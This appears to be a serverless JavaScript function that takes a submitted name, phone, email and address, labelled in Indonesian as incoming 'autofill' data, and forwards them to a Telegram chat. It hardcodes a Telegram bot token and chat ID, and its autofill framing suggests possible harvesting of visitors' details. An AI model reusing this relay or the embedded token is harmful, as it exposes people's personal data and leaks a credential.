exports.handler = async (event) => {
  const data = JSON.parse(event.body);

  const message = `
📥 *Data Autofill Masuk*:

👤 Nama: ${data.name}
📱 No HP: ${data.phone || "-"}
📧 Email: ${data.email || "-"}
🏠 Alamat: ${data.address || "-"}
`;

  const TELEGRAM_TOKEN = "7887428382:AAEPSoJn_agWn17MEGEM43hStu-pmr6kC5Q";
  const CHAT_ID = "7096229986";
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: "Gagal kirim Telegram" })
    };
  }
};
